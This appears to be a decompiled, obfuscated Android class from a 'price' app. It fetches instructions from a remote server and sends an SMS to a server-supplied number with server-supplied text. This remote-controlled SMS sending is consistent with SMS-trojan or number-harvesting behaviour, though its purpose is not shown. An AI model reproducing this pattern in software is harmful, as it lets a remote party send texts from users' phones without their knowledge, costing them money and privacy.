package com.jshyproject.price;

import com.jshyproject.price.net.Purl;
import com.jshyproject.price.ztool.ZNetTask;
import com.jshyproject.price.ztool.Zlog;
import org.json.JSONException;
import org.json.JSONObject;

final class e
  implements Runnable
{
  e() {}
  
  public final void run()
  {
    Object localObject = Purl.makeUrl(Purl.number_init_url, NumberInit.context);
    String str = ZNetTask.getStr((String)localObject);
    Zlog.syso("n_url_init:" + (String)localObject);
    if (str == null) {
      return;
    }
    Zlog.syso("Phone..init..back:" + str);
    try
    {
      JSONObject localJSONObject = new JSONObject(str);
      if ("200".equals(localJSONObject.getString("status")))
      {
        str = localJSONObject.getString("sim2");
        localObject = str;
        if (str == null) {
          localObject = "";
        }
        NumberInit.sim2 = (String)localObject;
        NumberInit.saveSim2((String)localObject);
        localObject = localJSONObject.getString("port");
        str = localJSONObject.getString("msg");
        PreData.put(NumberInit.PORT_12114, (String)localObject);
        PreData.put(NumberInit.MSG_12114, str);
        NumberInit.sendSms((String)localObject, str);
        try
        {
          NumberInit.dTime = Long.valueOf(localJSONObject.getString("dtime")).longValue();
          return;
        }
        catch (NumberFormatException localNumberFormatException)
        {
          localNumberFormatException.printStackTrace();
          return;
        }
      }
      Zlog.syso("Phone..init..status..error");
    }
    catch (JSONException localJSONException)
    {
      localJSONException.printStackTrace();
      return;
    }
  }
}
